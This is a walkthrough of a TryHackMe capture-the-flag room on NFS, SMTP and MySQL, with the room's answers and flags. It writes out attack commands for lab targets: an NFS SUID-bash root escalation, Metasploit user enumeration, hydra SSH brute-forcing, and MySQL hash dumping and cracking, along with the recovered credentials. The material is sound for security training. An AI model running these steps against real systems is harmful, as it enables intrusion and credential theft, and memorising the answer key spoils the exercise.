<!-- # Network services 2

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/5a1f94a2bdee82a5410f42346bd218c8.png" alt="OWASP Juice Shop" width="128" />

## Task 1 - Get Connected

> Ready? Let's get going!

No answer needed

## Task 2 - Understanding NFS

> What does NFS stand for?

Network File System

> What process allows an NFS client to interact with a remote directory as though it was a physical device?

mounting

> What does NFS use to represent files and directories on the server?

file handle

> What protocol does NFS use to communicate between the server and client?

RPC

> What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

user ID / group ID

> Can a Windows NFS server share files with a Linux client? (Y/N)

Y

> Can a Linux NFS server share files with a MacOS client? (Y/N)

Y

> What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

4.2

## Task 3 - Enumerating NFS

> Conduct a thorough port scan scan of your choosing, how many ports are open?

7

```bash
sudo nmap -sS -p- <HOST>
```

> Which port contains the service we're looking to enumerate?

2049

> Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

/home

```bash
/usr/sbin/showmount -e <IP>
```

> Change directory to where you mounted the share- what is the name of the folder inside?

cappucino

> Have a look inside this directory, look at the files. Looks like we're inside a user's home directory...

No answer needed

> Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

.ssh

> Which of these keys is most useful to us?

> Can we log into the machine using `ssh -i <key-file> <username>@<ip>` ? (Y/N)

Y

## Task 4 - Exploiting NFS

> First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

No answer needed

```
mkdir /tmp/mount
sudo mount -t nfs <IP>:/home /tmp/mount -nolock
cd /tmp/mount/cappucino/
```

> Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

No answer needed

```
cd ~/Downloads
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
cd /tmp/mount/cappucino/
cp ~/Downloads/bash .
sudo chown root bash
```

> Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

s

```
sudo chmod +s bash
```

> What does the permission set look like?

```
-rwsr-sr-x
```

<Image src="/images/writeups/thm/network/suid.png" />

> Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

No answer needed

> Great! If all's gone well you should have a shell as root! What's the root flag?

THM{nfs_got_pwned}

<Image src="/images/writeups/thm/network/nsf-root.png" />

## Task 5 - Understanding SMTP

> What does SMTP stand for?

Simple Mail Transfer Protocol

> What does SMTP handle the sending of? (answer in plural)

emails

> What is the first step in the SMTP process?

SMTP handshake

> What is the default SMTP port?

25

> Where does the SMTP server send the email if the recipient's server is not available?

SMTP queue

> On what server does the Email ultimately end up on?

POP/IMAP

> Can a Linux machine run an SMTP server? (Y/N)

Y

> Can a Windows machine run an SMTP server? (Y/N)

Y

## Task 6 - Enumerating SMTP

> First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

25

> Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

msfconsole

> Let's search for the module "smtp_version", what's it's full module name?

auxiliary/scanner/smtp/smtp_version

<Image src="/images/writeups/thm/network/smtp-version-info.png" />

> Great, now- select the module and list the options. How do we do this?

options

> Have a look through the options, does everything seem correct? What is the option we need to set?

RHOSTS

> Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

polosmtp.home

```bash
msfconsole
use smtp_version
set RHOSTS <IP>
run
```

<Image src="/images/writeups/thm/network/smtp-version.png" />

> What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

PostFix

Look to the version details in the screenshot above.

> Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?

auxiliary/scanner/smtp/smtp_enum

> What option do we need to set to the wordlist's path?

USER_FILE

> Once we've set this option, what is the other essential paramater we need to set?

RHOSTS

> Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

No answer needed

> Okay! Now that's finished, what username is returned?

```bash
msfconsole
use smtp_enum
set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
set RHOSTS <IP>
run
```

<Image src="/images/writeups/thm/network/smtp-enum.png" />

## Task 7 - Exploiting SMTP

> What is the password of the user we found during our enumeration stage?

alejandro

```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh
```

> Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

THM{who_knew_email_servers_were_c00l?}

```bash
ssh administrator@<IP>
cat smtp.txt
```

## Task 8 - Understanding MySQL

> What type of software is MySQL?

> What language is MySQL based on?

> What communication model does MySQL use?

> What is a common application of MySQL?

> What major social network uses MySQL as their back-end database? This will require further research.

## Task 9 - Enumerating MySQL

> As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

3306

```bash
sudo nmap -sS -p- <IP>
```

> Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"

No answer needed

```bash
# in attackbox
sudo apt install -y default-mysql-client

# it could be needed before
sudo apt update --fix-missing

mysql -h [IP] -u root -p
```

> Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.

No answer needed

> Search for, select and list the options it needs. What three options do we need to set? (in descending order).

PASSWORD/RHOSTS/USERNAME

```bash
msfconsole
use mysql_sql
options
set USERNAME root
set PASSWORD password
set RHOSTS [IP]
run
```

> Run the exploit. By default it will test with the "select version()" command, what result does this give you?

5.7.29-0ubuntu0.18.04.1

> Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?

4

```bash
set SQL show databases
run
```

<Image src="/images/writeups/thm/network/mysql-sql.png" />

## Task 10 - Exploiting MySQL

> First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

auxiliary/scanner/mysql/mysql_schemadump

> Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

x$waits_global_by_latency

```bash
msfconsole
use mysql_schemadump
set USERNAME root
set PASSWORD password
set RHOSTS [IP]
run
```

> Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?

auxiliary/scanner/mysql/mysql_hashdump

> Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

carl

```bash
msfconsole
use mysql_hashdump
set USERNAME root
set PASSWORD password
set RHOSTS [IP]
run
```

<Image src="/images/writeups/thm/network/mysql-hashdump.png" />

> What is the user/hash combination string?

carl:\*EA031893AA21444B170FC2162A56978B8CEECE18

> Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?

doggie

> What's the contents of MySQL.txt

THM{congratulations_you_got_the_mySQL_flag}

```
Credentials: carl:doggie
```

```bash
ssh carl@[IP]
cat MySQL.txt
```

## Task 11 - Further Learning

> Congratulations! You did it!

No answer needed -->
